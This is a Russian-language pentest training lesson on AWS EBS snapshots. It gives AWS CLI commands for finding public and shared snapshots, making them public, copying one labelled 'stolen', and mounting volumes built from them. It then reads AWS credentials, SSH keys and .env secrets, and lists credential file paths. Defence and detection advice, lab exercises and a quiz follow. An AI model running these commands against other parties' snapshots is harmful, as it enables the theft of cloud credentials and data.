---
id: cloud-aws-ebs
title: "EBS-снапшоты: расшаривание, монтирование и поиск секретов"
category: cloud
parent: cloud-aws-access-deep
difficulty: medium
order: 2
tags: [cloud, aws, ebs, snapshot, volume, secrets, forensics, privesc]
prerequisites: [cloud-aws-access-deep, cloud-ec2-ssrf]
useful_for:
  - "Извлечение секретов из дисков EC2"
  - "Пентест AWS через снапшоты"
  - "Форензика и восстановление данных"
estimated_minutes: 45
summary: "EBS-снапшоты: публичные и расшаренные снапшоты, копирование, создание тома и монтирование. Где на диске лежат SSH-ключи, креды AWS и секреты приложений."
---

## Зачем этот урок

EBS-снапшоты — это побайтовые копии дисков EC2. Админы расшаривают их между аккаунтами для бэкапов, миграций и передачи образов, часто забывая, что внутри лежат `~/.aws/credentials`, `~/.ssh/id_rsa`, `.env`, конфиги баз и токены CI. Публичные снапшоты — отдельная классика: тысячи снапшотов в AWS открыты всему миру, и в них регулярно находят ключи. Для атакующего это «тихий» путь: вы не трогаете прод-инстанс, а работаете с копией в своём аккаунте.

## Модель EBS и снапшотов

- **Volume** — сетевой диск, привязанный к инстансу в одной AZ.
- **Snapshot** — копия состояния тома на момент времени; хранится в S3 под управлением AWS, но не видна как обычный бакет.
- **Snapshot permissions** — `createVolumePermission`: приватный, расшаренный конкретному аккаунту (`restorableBy`/`accountIds`) или публичный (`group: all`).
- **Encryption** — снапшот может быть зашифрован KMS-ключом; незашифрованный копируется свободно, зашифрованный требует прав на ключ.
- **AMI** — образ, ссылающийся на снапшоты; публичные AMI иногда содержат снапшоты с данными.

Ключевые API: `ec2:DescribeSnapshots`, `ec2:ModifySnapshotAttribute` (сделать публичным/расшарить), `ec2:CreateVolume` (из снапшота), `ec2:AttachVolume`, `ec2:CopySnapshot`.

## Инструменты и команды

```bash
# Свои снапшоты
aws ec2 describe-snapshots --owner-ids self \
  --query 'Snapshots[].{ID:SnapshotId,Vol:VolumeId,Size:VolumeSize,Enc:Encrypted,Desc:Description}' --output table

# Публичные снапшоты (могут быть тысячи — фильтруйте)
aws ec2 describe-snapshots --restorable-by all --region us-east-1 \
  --query 'Snapshots[?Encrypted==`false`].{ID:SnapshotId,Desc:Description}' --output table | head -40

# Снапшоты, расшаренные с нами
aws ec2 describe-snapshots --owner-ids 111122223333 \
  --query 'Snapshots[?Encrypted==`false`].SnapshotId'

# Кто имеет доступ к снапшоту
aws ec2 describe-snapshot-attribute --snapshot-id snap-0abc --attribute createVolumePermission

# Расшарить свой снапшот на внешний аккаунт (если есть права)
aws ec2 modify-snapshot-attribute --snapshot-id snap-0abc \
  --attribute createVolumePermission --operation-type add --group-names all

# Скопировать в свой регион/аккаунт
aws ec2 copy-snapshot --source-region us-east-1 --source-snapshot-id snap-0abc \
  --region eu-west-1 --description "stolen"
```

## Разобранный пример: публичный снапшот → секреты

Сценарий: нашли публичный незашифрованный снапшот с описанием `web-server-backup`.

```bash
# 1. Создаём том из снапшота в своей AZ
aws ec2 create-volume --snapshot-id snap-0abc123 --availability-zone us-east-1a \
  --volume-type gp3
# {"VolumeId":"vol-0def456","State":"creating","AvailabilityZone":"us-east-1a"}
aws ec2 wait volume-available --volume-ids vol-0def456

# 2. Поднимаем свой инстанс (или используем существующий) и аттачим том
aws ec2 attach-volume --volume-id vol-0def456 --instance-id i-0aaa111 --device /dev/sdf

# 3. На инстансе монтируем и ищем секреты
lsblk
# nvme1n1  259:1  0  30G 0 disk
sudo mount /dev/nvme1n1p1 /mnt
sudo find /mnt -maxdepth 4 \( -name '*.pem' -o -name 'id_rsa*' -o -name '.env' -o -name 'credentials' \) 2>/dev/null
# /mnt/home/ubuntu/.ssh/id_rsa
# /mnt/home/ubuntu/.aws/credentials
# /mnt/var/www/app/.env

sudo cat /mnt/home/ubuntu/.aws/credentials
# [default]
# aws_access_key_id = AKIA...
# aws_secret_access_key = ...
sudo cat /mnt/var/www/app/.env
# DB_PASSWORD=...
# STRIPE_SECRET_KEY=sk_live_...
```

Теперь у нас есть SSH-ключ, долгоживущие AWS-ключи и секреты приложения. Если снапшот был публичным, эти креды могли быть скомпрометированы задолго до нас.

## Что искать на диске

| Путь | Что там |
|---|---|
| `~/.aws/credentials`, `~/.aws/config` | AWS access keys, профили |
| `~/.ssh/id_rsa`, `authorized_keys` | Приватные ключи, доступ к серверам |
| `/etc/shadow`, `/etc/passwd` | Хеши паролей |
| `.env`, `*.yml`, `config.json` | Секреты приложений, токены |
| `~/.git-credentials`, `.git/config` | Токены репозиториев |
| `/var/lib/.../secrets` | Секреты Kubernetes/сервисов |
| История bash | Команды с паролями, curl с токенами |
| `/home/*/.bash_history` | Утечки секретов в истории |

## Обход защит и edge cases

- **Шифрование.** Зашифрованный снапшот нельзя скопировать/смонтировать без KMS-ключа. Если ключ — `aws/ebs` (managed), копия возможна в некоторых случаях через `copy-snapshot` с указанием CMK. Иначе ищите незашифрованные.
- **Snapshot sharing с чужим аккаунтом.** Снапшот может быть расшарен конкретному аккаунту; тогда `describe-snapshots --owner-ids` его покажет, и можно создать том.
- **AMI.** Публичные AMI содержат ссылки на снапшоты; `describe-images --owners self` и `--public` помогут найти образы с данными.
- **Region lock.** Снапшот привязан к региону; копирование между регионами — отдельный шаг.
- **KMS grant.** Иногда у роли есть `kms:CreateGrant` на ключ, что позволяет расшифровать снапшот косвенно.
- **Instance store vs EBS.** Instance-store диски не снапшотятся; для них нужен доступ к самому хосту.

## Частые ошибки и подводные камни

- Пытаться смонтировать снапшот напрямую: снапшот нельзя примонтировать, только созданный из него том.
- Забыть про AZ: том создаётся в конкретной AZ, инстанс должен быть в той же.
- Игнорировать LVM/шифрование на уровне ФС (LUKS): том смонтируется, но данные зашифрованы.
- Не проверить историю bash и логи — там часто больше секретов, чем в файлах.
- Считать публичный снапшот «безопасным»: внутри может быть весь прод-диск.

## Защита и детект

- Запретить публичные снапшоты через SCP и Config-правило `ebs-snapshot-public-restorable-check`.
- Шифровать EBS по умолчанию (account-level EBS encryption) и использовать CMK.
- Ограничить `ec2:ModifySnapshotAttribute` и `ec2:CreateVolume`; алертить на копирование снапшотов между аккаунтами.
- Не хранить долгоживущие креды на дисках; использовать instance profile и ротацию.
- GuardDuty `Exfiltration:EBS` и CloudTrail `CopySnapshot`/`CreateVolume` — ключевые события.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — публичный снапшот с данными. Второй — снапшот, расшаренный «партнёру» без ограничений. Третий — незашифрованные EBS-диски. Четвёртый — секреты на диске (ключи, `.env`). Пятый — отсутствие Object Lock/аудита на снапшотах. Все они позволяют получить данные без касания прод-инстанса.

## Практическое задание

1. Создайте инстанс, положите на диск `.env` и `~/.aws/credentials`, сделайте снапшот.
2. Расшарьте снапшот на второй аккаунт и восстановите том из него.
3. Смонтируйте том и найдите файлы секретов.
4. Включите Config-правило для публичных снапшотов и проверьте, что публичный снапшот помечается.

## Что дальше / решение

Из EBS-снапшота достаём ключи, пароли и токены. Дальше — использовать их против сервисов и аккаунтов. Зафиксируйте путь «публичный/расшаренный снапшот → том → секреты» в графе. Если снапшот зашифрован и KMS недоступен — `blocked` с условием «нужен kms:Decrypt/CreateGrant».

## Разобранный пример 2: публичная AMI как источник снапшота

AMI (Amazon Machine Image) ссылается на один или несколько снапшотов. Публичные AMI — общие образы сообщества и маркетплейса — иногда содержат снапшоты с забытыми данными: SSH-ключи в `/root/.ssh`, конфиги приложений, тестовые секреты.

```bash
# Ищем образы, которые нам доступны
aws ec2 describe-images --owners self --query 'Images[].{ID:ImageId,Name:Name,Snaps:BlockDeviceMappings[].Ebs.SnapshotId}'
# Публичные образы (осторожно, их очень много)
aws ec2 describe-images --owners amazon --filters Name=name,Values='*' --max-results 5 \
  --query 'Images[].ImageId'

# Смотрим, на какие снапшоты ссылается образ
aws ec2 describe-images --image-ids ami-0abc \
  --query 'Images[0].BlockDeviceMappings[].Ebs.{Snap:SnapshotId,Size:VolumeSize,Enc:Encrypted}'
# [{"Snap":"snap-0def","Size":30,"Enc":false}]

# Дальше — как обычно: create-volume из снапшота, attach, mount
aws ec2 create-volume --snapshot-id snap-0def --availability-zone us-east-1a
```

Если у вашего аккаунта есть право `ec2:DescribeImages` и снапшот доступен, вы можете собрать инстанс из чужого образа. Особенно полезны образы, которые «уже не поддерживаются»: их владельцы не следят за содержимым. Проверяйте `Public:true` и `OwnerId` в выводе.

## Практическое задание (продолжение)

1. Сделайте AMI из своего инстанса и найдите связанные снапшоты.
2. Скопируйте снапшот AMI в другой регион и создайте из него том.
3. Включите EBS encryption by default и проверьте, что новые снапшоты зашифрованы.
4. Настройте Config-правило для публичных снапшотов и протестируйте срабатывание.

## Квиз

```quiz
- question: "Почему EBS-снапшот нельзя примонтировать напрямую?"
  options:
    - "Из него сначала создают том, который и монтируется"
    - "Он зашифрован всегда"
    - "Он существует только в S3-бакете"
    - "Он доступен только root"
  answer: 0
  explanation: "Снапшот — снимок; для чтения создаётся volume, который привязывается к инстансу."
- question: "Что даёт ec2:ModifySnapshotAttribute с group-names all?"
  options:
    - "Делает снапшот публичным для всех аккаунтов"
    - "Удаляет снапшот"
    - "Шифрует снапшот"
    - "Меняет регион"
  answer: 0
  explanation: "group: all — публичный доступ, любой аккаунт может создать том."
- question: "Где на диске искать долгоживущие AWS-креды?"
  options:
    - "~/.aws/credentials"
    - "/etc/hosts"
    - "/proc/cpuinfo"
    - "/var/log/cloudtrail"
  answer: 0
  explanation: "Профили AWS CLI с access key лежат в ~/.aws/credentials."
- question: "Что мешает использовать зашифрованный снапшот?"
  options:
    - "Нужны права на KMS-ключ, которым он зашифрован"
    - "Он удаляется через час"
    - "Он только для чтения"
    - "Он привязан к IAM-пользователю"
  answer: 0
  explanation: "KMS-ключ не расшаривается вместе со снапшотом."
```

## Где пригодится

- **Пентест AWS:** извлечение секретов из дисков.
- **Red team:** тихий доступ к данным через копию.
- **Форензика:** анализ диска после инцидента.
- **Cloud security review:** запрет публичных снапшотов.
